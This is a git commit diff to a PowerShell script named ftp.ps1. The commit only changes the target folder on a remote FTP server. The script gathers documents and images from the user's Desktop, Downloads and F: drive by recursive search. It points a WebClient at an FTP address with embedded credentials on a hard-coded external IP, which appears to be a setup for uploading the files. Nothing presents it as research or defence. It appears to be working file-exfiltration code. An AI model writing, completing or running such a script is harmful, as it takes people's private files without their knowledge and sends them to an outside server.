c7f72348fb2a8ecc102f1fe50c653a01c0ae8fa1
louist12 <114141279+louist12@users.noreply.github.com>
2022-10-03 15:08:19 +0530

    Update ftp.ps1

--- ftp.ps1
+++ ftp.ps1
@@ -1,6 +1,6 @@
 ﻿$WebClient = New-Object System.Net.WebClient
 $Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
-$FTP = "ftp://testadmin:testpassword@192.119.71.89/"
+$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
 
 
 foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse)){
